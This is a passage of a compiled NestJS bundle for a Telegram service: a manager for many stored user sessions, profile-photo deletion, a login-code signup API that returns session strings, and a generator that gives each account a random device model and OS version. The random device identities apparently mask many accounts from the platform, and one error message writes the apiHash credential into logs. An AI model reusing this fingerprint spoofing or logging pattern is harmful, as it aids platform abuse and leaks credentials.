    (0, swagger_1.ApiProperty)({
        description: 'Base64 encoded media data (when sourceType is base64)',
        required: false,
        example: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD...'
    }),
    (0, class_validator_1.ValidateIf)(o => o.sourceType === MediaSourceType.BASE64),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "base64Data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Binary media data (when sourceType is binary)',
        required: false,
        type: 'string',
        format: 'binary'
    }),
    (0, class_validator_1.ValidateIf)(o => o.sourceType === MediaSourceType.BINARY),
    __metadata("design:type", Object)
], ViewOnceMediaDto.prototype, "binaryData", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Optional caption for the media',
        required: false,
        example: 'Check this out! It will disappear after viewing'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "caption", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Optional filename for the media',
        required: false,
        example: 'secret_image.jpg'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ViewOnceMediaDto.prototype, "filename", void 0);


/***/ }),

/***/ "./src/components/Telegram/index.ts":
/*!******************************************!*\
  !*** ./src/components/Telegram/index.ts ***!
  \******************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./Telegram.controller */ "./src/components/Telegram/Telegram.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./Telegram.service */ "./src/components/Telegram/Telegram.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./Telegram.module */ "./src/components/Telegram/Telegram.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto/update-profile.dto */ "./src/components/Telegram/dto/update-profile.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto/channel-operation.dto */ "./src/components/Telegram/dto/channel-operation.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts"), exports);
__exportStar(__webpack_require__(/*! ./utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts"), exports);
__exportStar(__webpack_require__(/*! ./utils/rate-limiter */ "./src/components/Telegram/utils/rate-limiter.ts"), exports);


/***/ }),

/***/ "./src/components/Telegram/utils/connection-manager.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/utils/connection-manager.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.connectionManager = void 0;
exports.unregisterClient = unregisterClient;
const TelegramManager_1 = __importDefault(__webpack_require__(/*! ../TelegramManager */ "./src/components/Telegram/TelegramManager.ts"));
const parseError_1 = __webpack_require__(/*! ../../../utils/parseError */ "./src/utils/parseError.ts");
const telegram_logger_1 = __webpack_require__(/*! ./telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const withTimeout_1 = __webpack_require__(/*! ../../../utils/withTimeout */ "./src/utils/withTimeout.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const utils_1 = __webpack_require__(/*! ../../../utils */ "./src/utils/index.ts");
const bots_service_1 = __webpack_require__(/*! ../../../components/bots/bots.service */ "./src/components/bots/bots.service.ts");
const isPermanentError_1 = __importDefault(__webpack_require__(/*! ../../../utils/isPermanentError */ "./src/utils/isPermanentError.ts"));
class ConnectionManager {
    constructor() {
        this.clients = new Map();
        this.logger = new telegram_logger_1.TelegramLogger('ConnectionManager');
        this.cleanupTimer = null;
        this.usersService = null;
        this.isShuttingDown = false;
        this.MAX_CONNECTIONS = 50;
        this.IDLE_TIMEOUT = 300000;
        this.CLEANUP_INTERVAL = 60000;
        this.MAX_RETRY_ATTEMPTS = 3;
        this.startCleanup();
    }
    static getInstance() {
        if (!ConnectionManager.instance) {
            ConnectionManager.instance = new ConnectionManager();
        }
        return ConnectionManager.instance;
    }
    setUsersService(usersService) {
        this.usersService = usersService;
    }
    async getClient(mobile, options = {}) {
        if (!mobile) {
            throw new common_1.BadRequestException('Mobile number required');
        }
        if (this.isShuttingDown) {
            throw new common_1.InternalServerErrorException('Manager is shutting down');
        }
        if (this.clients.size >= this.MAX_CONNECTIONS) {
            await this.forceCleanup();
            if (this.clients.size >= this.MAX_CONNECTIONS) {
                throw new common_1.InternalServerErrorException('Connection limit reached');
            }
        }
        const { autoDisconnect = true, handler = true, forceReconnect = false } = options;
        const connectPromise = (async () => {
            try {
                const existingClient = this.clients.get(mobile);
                if (existingClient && !forceReconnect) {
                    if (existingClient.state === 'connected' && this.isClientHealthy(existingClient)) {
                        this.updateLastUsed(mobile);
                        this.logger.info(mobile, 'Reusing healthy client');
                        return existingClient.client;
                    }
                }
                if (existingClient) {
                    this.logger.info(mobile, 'Cleaning up old client');
                    await this.unregisterClient(mobile);
                    await (0, Helpers_1.sleep)(3000);
                }
                return await this.createNewClient(mobile, { autoDisconnect, handler });
            }
            catch (error) {
                throw error;
            }
        })();
        return await connectPromise;
    }
    async createNewClient(mobile, options) {
        if (!this.usersService) {
            throw new common_1.InternalServerErrorException('UsersService not initialized');
        }
        this.logger.info(mobile, 'Creating new client', options);
        const users = await this.usersService.search({ mobile });
        const user = users[0];
        if (!user) {
            throw new common_1.NotFoundException(`[Connection Manager]\nUser not found : ${mobile}`);
        }
        const telegramManager = new TelegramManager_1.default(user.session, user.mobile);
        const clientInfo = {
            client: telegramManager,
            lastUsed: Date.now(),
            autoDisconnect: options.autoDisconnect,
            state: 'connecting',
            connectionAttempts: 1
        };
        this.clients.set(mobile, clientInfo);
        try {
            await telegramManager.createClient(options.handler);
            await this.validateConnection(mobile, telegramManager);
            clientInfo.state = 'connected';
            clientInfo.connectionAttempts = 1;
            delete clientInfo.lastError;
            this.clients.set(mobile, clientInfo);
            return telegramManager;
        }
        catch (error) {
            this.logger.error(mobile, 'Client creation failed', error);
            await this.handleConnectionError(mobile, clientInfo, error);
            await this.unregisterClient(mobile);
            throw error;
        }
    }
    async validateConnection(mobile, client) {
        await (0, withTimeout_1.withTimeout)(() => client.client.getMe(), {
            errorMessage: `getMe TimeOut for ${mobile}\napiId: ${client.apiId}\napiHash:${client.apiHash}`,
            maxRetries: 3,
            throwErr: true
        });
    }
    isClientHealthy(clientInfo) {
        const now = Date.now();
        const isConnected = clientInfo.client?.connected() === true;
        const isNotStale = (now - clientInfo.lastUsed) < this.IDLE_TIMEOUT;
        const hasNoErrors = clientInfo.state === 'connected' && !clientInfo.lastError;
        return isConnected && isNotStale && hasNoErrors;
    }
    async handleConnectionError(mobile, clientInfo, error) {
        clientInfo.lastError = error.message;
        clientInfo.state = 'error';
        this.clients.set(mobile, clientInfo);
        const errorDetails = (0, parseError_1.parseError)(error, mobile, false);
        let markedAsExpired = false;
        if ((0, isPermanentError_1.default)(errorDetails)) {
            this.logger.info(mobile, 'Marking user as expired due to permanent error');
            try {
                const users = await this.usersService.search({ mobile });
                const user = users[0];
                if (user) {
                    await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });
                    markedAsExpired = true;
                }
            }
            catch (updateError) {
                this.logger.error(mobile, 'Failed to mark user as expired', updateError);
            }
        }
        try {
            const botsService = (0, utils_1.getBotsServiceInstance)();
            if (botsService) {
                const botMessage = `Client connection error for ${mobile}\n\n${errorDetails.message}\n\nMarkedAsExpired: ${markedAsExpired}`;
                await botsService.sendMessageByCategory(bots_service_1.ChannelCategory.ACCOUNT_LOGIN_FAILURES, botMessage);
            }
        }
        catch (notificationError) {
            this.logger.error(mobile, 'Failed to send error notification', notificationError);
        }
    }
    async unregisterClient(mobile) {
        const clientInfo = this.clients.get(mobile);
        if (!clientInfo)
            return;
        try {
            clientInfo.state = 'disconnected';
            await (0, withTimeout_1.withTimeout)(() => clientInfo.client.destroy(), {
                timeout: 30000,
                errorMessage: "Client destroy timeout"
            });
        }
        catch (error) {
            this.logger.error(mobile, 'Error destroying client', error);
        }
        finally {
            this.clients.delete(mobile);
        }
    }
    updateLastUsed(mobile) {
        const clientInfo = this.clients.get(mobile);
        if (clientInfo) {
            clientInfo.lastUsed = Date.now();
            this.clients.set(mobile, clientInfo);
        }
    }
    hasClient(mobile) {
        const clientInfo = this.clients.get(mobile);
        return clientInfo !== undefined && clientInfo.state === 'connected';
    }
    getClientState(mobile) {
        const clientInfo = this.clients.get(mobile);
        if (!clientInfo)
            return undefined;
        return {
            autoDisconnect: clientInfo.autoDisconnect,
            connectionAttempts: clientInfo.connectionAttempts,
            lastUsed: clientInfo.lastUsed,
            state: clientInfo.state,
            lastError: clientInfo.lastError
        };
    }
    getConnectionStats() {
        const stats = {
            total: this.clients.size,
            connected: 0,
            connecting: 0,
            disconnected: 0,
            error: 0
        };
        for (const client of this.clients.values()) {
            stats[client.state]++;
        }
        return stats;
    }
    async cleanup() {
        if (this.isShuttingDown)
            return;
        const now = Date.now();
        const toRemove = [];
        for (const [mobile, clientInfo] of this.clients.entries()) {
            const isIdle = (now - clientInfo.lastUsed) > this.IDLE_TIMEOUT;
            const shouldAutoDisconnect = clientInfo.autoDisconnect && isIdle;
            const isStale = (now - clientInfo.lastUsed) > (this.IDLE_TIMEOUT * 2);
            const isErrored = clientInfo.state === 'error';
            const tooManyAttempts = clientInfo.connectionAttempts >= this.MAX_RETRY_ATTEMPTS;
            if (shouldAutoDisconnect || isStale || isErrored || tooManyAttempts) {
                this.logger.info(mobile, 'Marking for cleanup', {
                    shouldAutoDisconnect,
                    isStale,
                    isErrored,
                    tooManyAttempts,
                    idleTime: now - clientInfo.lastUsed
                });
                toRemove.push(mobile);
            }
        }
        const removePromises = toRemove.slice(0, 10).map(mobile => this.unregisterClient(mobile).catch(error => this.logger.error(mobile, 'Cleanup removal failed', error)));
        if (removePromises.length > 0) {
            await Promise.allSettled(removePromises);
            this.logger.info('Default', `Cleanup completed - removed ${removePromises.length} clients`);
        }
    }
    async forceCleanup() {
        this.logger.info('Default', 'Force cleanup triggered');
        const oldestClients = Array.from(this.clients.entries())
            .sort(([, a], [, b]) => a.lastUsed - b.lastUsed)
            .slice(0, Math.ceil(this.MAX_CONNECTIONS * 0.2))
            .map(([mobile]) => mobile);
        for (const mobile of oldestClients) {
            await this.unregisterClient(mobile);
        }
        this.logger.info('Default', `Force cleanup completed - removed ${oldestClients.length} clients`);
    }
    async forceReconnect(mobile) {
        this.logger.info(mobile, 'Force reconnect requested');
        await this.unregisterClient(mobile);
        return this.getClient(mobile, { forceReconnect: true });
    }
    startCleanup() {
        if (this.cleanupTimer)
            return;
        this.cleanupTimer = setInterval(() => {
            this.cleanup().catch(error => this.logger.error('Default', 'Cleanup error', error));
        }, this.CLEANUP_INTERVAL);
        this.logger.info('Default', `Cleanup started - ${this.CLEANUP_INTERVAL}ms interval`);
    }
    stopCleanup() {
        if (this.cleanupTimer) {
            clearInterval(this.cleanupTimer);
            this.cleanupTimer = null;
        }
    }
    async shutdown() {
        this.isShuttingDown = true;
        this.stopCleanup();
        await this.disconnectAll();
        this.clients.clear();
    }
    async disconnectAll() {
        const disconnectPromises = Array.from(this.clients.keys()).map(mobile => this.unregisterClient(mobile).catch(error => this.logger.error(mobile, 'Shutdown disconnect failed', error)));
        await Promise.allSettled(disconnectPromises);
    }
    getActiveConnectionCount() {
        return Array.from(this.clients.values())
            .filter(client => client.state === 'connected').length;
    }
    getClientList() {
        return Array.from(this.clients.keys());
    }
    getHealthReport() {
        const unhealthyClients = [];
        let healthyCount = 0;
        for (const [mobile, clientInfo] of this.clients.entries()) {
            if (this.isClientHealthy(clientInfo)) {
                healthyCount++;
            }
            else {
                unhealthyClients.push(mobile);
            }
        }
        return {
            totalClients: this.clients.size,
            healthyClients: healthyCount,
            unhealthyClients,
            memoryUsage: process.memoryUsage().heapUsed
        };
    }
}
ConnectionManager.instance = null;
exports.connectionManager = ConnectionManager.getInstance();
async function unregisterClient(mobile) {
    await exports.connectionManager.unregisterClient(mobile);
}


/***/ }),

/***/ "./src/components/Telegram/utils/deleteProfilePics.ts":
/*!************************************************************!*\
  !*** ./src/components/Telegram/utils/deleteProfilePics.ts ***!
  \************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.deleteProfilePhotos = deleteProfilePhotos;
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
async function deleteProfilePhotos(client, photos) {
    try {
        if (!photos) {
            const result = await client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            console.info(`Profile Pics found: ${result.photos.length}`);
            photos = result?.photos;
        }
        if (photos?.length > 0) {
            await client.invoke(new telegram_1.Api.photos.DeletePhotos({
                id: photos
            }));
        }
        console.info("Deleted profile Photos");
    }
    catch (error) {
        throw error;
    }
}


/***/ }),

/***/ "./src/components/Telegram/utils/generateTGConfig.ts":
/*!***********************************************************!*\
  !*** ./src/components/Telegram/utils/generateTGConfig.ts ***!
  \***********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.generateTGConfig = generateTGConfig;
const redisClient_1 = __webpack_require__(/*! ../../../utils/redisClient */ "./src/utils/redisClient.ts");
const logger_1 = __webpack_require__(/*! ../../../utils/logger */ "./src/utils/logger.ts");
const logger = new logger_1.Logger(__filename);
const DEVICE_MODELS = [
    "Pixel 6", "iPhone 13", "Samsung Galaxy S22", "Redmi Note 12",
    "OnePlus 9", "Desktop", "MacBook Pro", "iPad Pro"
];
const SYSTEM_VERSIONS = [
    "Android 13", "iOS 16.6", "Windows 10", "Windows 11",
    "macOS 13.5", "Ubuntu 22.04", "Arch Linux"
];
const APP_VERSIONS = ["1.0.0", "2.1.3", "3.5.7", "4.0.2", "5.0.0"];
function pickRandom(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}
async function generateTGConfig(mobile, ttl = 60 * 60 * 24 * 60) {
    const redisKey = `tg:config:${mobile}`;
    const commonConfig = {
        connectionRetries: 10,
        requestRetries: 5,
        retryDelay: 2000,
        timeout: 30,
        autoReconnect: true,
        maxConcurrentDownloads: 3,
        downloadRetries: 5,
        useWSS: false,
        useIPV6: false,
    };
    const cached = await redisClient_1.RedisClient.getObject(redisKey);
    if (cached) {
        return {
            ...cached,
            ...commonConfig
        };
    }
    const variableConfig = {
        deviceModel: `${pickRandom(DEVICE_MODELS)}-ssk`,
        systemVersion: pickRandom(SYSTEM_VERSIONS),
        appVersion: pickRandom(APP_VERSIONS),
    };
    await redisClient_1.RedisClient.set(redisKey, variableConfig, ttl);
    return {
        ...commonConfig,
        ...variableConfig
    };
}


/***/ }),

/***/ "./src/components/Telegram/utils/getProfilePics.ts":
/*!*********************************************************!*\
  !*** ./src/components/Telegram/utils/getProfilePics.ts ***!
  \*********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.getProfilePics = getProfilePics;
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
async function getProfilePics(client, user = "me") {
    const userPhotos = await client.invoke(new telegram_1.Api.photos.GetUserPhotos({ userId: user }));
    return userPhotos?.photos;
}


/***/ }),

/***/ "./src/components/Telegram/utils/rate-limiter.ts":
/*!*******************************************************!*\
  !*** ./src/components/Telegram/utils/rate-limiter.ts ***!
  \*******************************************************/
/***/ ((__unused_webpack_module, exports) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.RateLimiter = void 0;
class RateLimiter {
    constructor(windowMs, maxRequests) {
        this.timestamps = new Map();
        this.windowMs = windowMs;
        this.maxRequests = maxRequests;
    }
    async checkRateLimit(key) {
        const now = Date.now();
        const timestamps = this.timestamps.get(key) || [];
        const validTimestamps = timestamps.filter(timestamp => now - timestamp < this.windowMs);
        if (validTimestamps.length >= this.maxRequests) {
            return false;
        }
        validTimestamps.push(now);
        this.timestamps.set(key, validTimestamps);
        return true;
    }
    async waitForRateLimit(key) {
        while (!(await this.checkRateLimit(key))) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
    resetLimit(key) {
        this.timestamps.delete(key);
    }
}
exports.RateLimiter = RateLimiter;


/***/ }),

/***/ "./src/components/Telegram/utils/telegram-logger.ts":
/*!**********************************************************!*\
  !*** ./src/components/Telegram/utils/telegram-logger.ts ***!
  \**********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramLogger = void 0;
const utils_1 = __webpack_require__(/*! ../../../utils */ "./src/utils/index.ts");
class TelegramLogger {
    constructor(serviceName = 'TelegramService') {
        this.logger = new utils_1.Logger(serviceName);
    }
    info(mobile, operation, details) {
        this.logger.log(`[${mobile}] ${operation}`, details);
    }
    error(mobile, operation, error) {
        this.logger.error(`[${mobile}] ${operation} - ${error.message}`, error.stack);
    }
    warn(mobile, message, details) {
        this.logger.warn(`[${mobile}] ${message}`, details);
    }
    debug(mobile, message, details) {
        this.logger.debug(`[${mobile}] ${message}`, details);
    }
    verbose(mobile, message, details) {
        this.logger.verbose(`[${mobile}] ${message}`, details);
    }
    log(mobile, message, details) {
        this.logger.log(`[${mobile}] ${message}`, details);
    }
}
exports.TelegramLogger = TelegramLogger;


/***/ }),

/***/ "./src/components/TgSignup/dto/index.ts":
/*!**********************************************!*\
  !*** ./src/components/TgSignup/dto/index.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./tg-signup.dto */ "./src/components/TgSignup/dto/tg-signup.dto.ts"), exports);


/***/ }),

/***/ "./src/components/TgSignup/dto/tg-signup.dto.ts":
/*!******************************************************!*\
  !*** ./src/components/TgSignup/dto/tg-signup.dto.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupResponse = exports.VerifyCodeDto = exports.SendCodeDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SendCodeDto {
}
exports.SendCodeDto = SendCodeDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Phone number to send the verification code to (international format)',
        example: '+919876543210'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.Matches)(/^\+\d{8,15}$/, { message: 'Invalid phone number format' }),
    __metadata("design:type", String)
], SendCodeDto.prototype, "phone", void 0);
class VerifyCodeDto {
}
exports.VerifyCodeDto = VerifyCodeDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Phone number used for verification (international format)',
        example: '919876543210'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.Matches)(/^\+\d{8,15}$/, { message: 'Invalid phone number format' }),
    __metadata("design:type", String)
], VerifyCodeDto.prototype, "phone", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Verification code received',
        example: '12345'
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    (0, class_validator_1.Matches)(/^\d{5}$/, { message: 'Code must be exactly 5 digits' }),
    __metadata("design:type", String)
], VerifyCodeDto.prototype, "code", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Two-factor authentication password if required',
        example: 'yourSecurePassword123',
        required: false
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => value === '' ? undefined : value),
    __metadata("design:type", String)
], VerifyCodeDto.prototype, "password", void 0);
class TgSignupResponse {
}
exports.TgSignupResponse = TgSignupResponse;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Operation status code',
        example: 200
    }),
    __metadata("design:type", Number)
], TgSignupResponse.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Response message',
        example: 'Login successful'
    }),
    __metadata("design:type", String)
], TgSignupResponse.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Phone code hash for verification',
        example: 'abc123xyz',
        required: false
    }),
    __metadata("design:type", String)
], TgSignupResponse.prototype, "phoneCodeHash", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the code was sent via app',
        example: true,
        required: false
    }),
    __metadata("design:type", Boolean)
], TgSignupResponse.prototype, "isCodeViaApp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Session string for authenticated client',
        required: false
    }),
    __metadata("design:type", String)
], TgSignupResponse.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether 2FA is required',
        example: false,
        required: false
    }),
    __metadata("design:type", Boolean)
], TgSignupResponse.prototype, "requires2FA", void 0);


/***/ }),

/***/ "./src/components/TgSignup/index.ts":
/*!******************************************!*\
  !*** ./src/components/TgSignup/index.ts ***!
  \******************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/TgSignup/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./tg-signup.controller */ "./src/components/TgSignup/tg-signup.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./tg-signup.module */ "./src/components/TgSignup/tg-signup.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./tg-signup.service */ "./src/components/TgSignup/tg-signup.service.ts"), exports);


/***/ }),

/***/ "./src/components/TgSignup/tg-signup.controller.ts":
/*!*********************************************************!*\
  !*** ./src/components/TgSignup/tg-signup.controller.ts ***!
  \*********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var TgSignupController_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TgSignupController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const tg_signup_service_1 = __webpack_require__(/*! ./tg-signup.service */ "./src/components/TgSignup/tg-signup.service.ts");
const tg_signup_dto_1 = __webpack_require__(/*! ./dto/tg-signup.dto */ "./src/components/TgSignup/dto/tg-signup.dto.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
let TgSignupController = TgSignupController_1 = class TgSignupController {
    constructor(tgSignupService) {
        this.tgSignupService = tgSignupService;
        this.logger = new utils_1.Logger(TgSignupController_1.name);
    }
    async sendCode(sendCodeDto) {
        try {
            this.logger.debug(`[SEND_CODE] Request received for phone: ${sendCodeDto.phone}`);
            const result = await this.tgSignupService.sendCode(sendCodeDto.phone);
            return {
                status: common_1.HttpStatus.CREATED,
                message: 'Code sent to your Telegram App',
                phoneCodeHash: result.phoneCodeHash,
                isCodeViaApp: result.isCodeViaApp
            };
        }
        catch (error) {
            this.logger.error(`[SEND_CODE] Error for phone: ${sendCodeDto.phone}`, {
                error,
                stack: error.stack
            });
            throw error;
        }
    }
    async verifyCode(verifyCodeDto) {
        try {
            this.logger.debug(`[VERIFY_CODE] Request received for phone: ${verifyCodeDto.phone}`);
            const result = await this.tgSignupService.verifyCode(verifyCodeDto.phone, verifyCodeDto.code, verifyCodeDto.password);
            return {
                status: result.requires2FA ? common_1.HttpStatus.BAD_REQUEST : common_1.HttpStatus.OK,
                message: result.message || 'Successfully logged in',
                session: result.session,
                requires2FA: result.requires2FA
            };
        }
        catch (error) {
            this.logger.error(`[VERIFY_CODE] Error for phone: ${verifyCodeDto.phone}`, {
                error,
                stack: error.stack
            });
            throw error;
        }
    }
};
exports.TgSignupController = TgSignupController;
__decorate([
    (0, common_1.Post)('send-code'),
    (0, swagger_1.ApiOperation)({
        summary: 'Send verification code to phone number',
        description: 'Initiates the signup process by sending a verification code via Telegram'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.CREATED,
        type: tg_signup_dto_1.TgSignupResponse,
        description: 'Code sent successfully'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid phone number or failed to send code',
        schema: {
            type: 'object',
            properties: {
                statusCode: { type: 'number', example: 400 },
                message: { type: 'string', example: 'Invalid phone number format' },
                error: { type: 'string', example: 'Bad Request' }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.TOO_MANY_REQUESTS,
        description: 'Rate limit exceeded'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.INTERNAL_SERVER_ERROR,
        description: 'Internal server error occurred'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [tg_signup_dto_1.SendCodeDto]),
    __metadata("design:returntype", Promise)
], TgSignupController.prototype, "sendCode", null);
__decorate([
    (0, common_1.Post)('verify'),
    (0, swagger_1.ApiOperation)({
        summary: 'Verify code and complete signup/login',
        description: 'Verifies the code sent to phone and completes the signup/login process'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        type: tg_signup_dto_1.TgSignupResponse,
        description: 'Verification successful'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid code or verification failed'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.TOO_MANY_REQUESTS,
        description: 'Rate limit exceeded'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.INTERNAL_SERVER_ERROR,
        description: 'Internal server error occurred'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [tg_signup_dto_1.VerifyCodeDto]),
    __metadata("design:returntype", Promise)
], TgSignupController.prototype, "verifyCode", null);
exports.TgSignupController = TgSignupController = TgSignupController_1 = __decorate([
    (0, common_1.Controller)('tgsignup'),
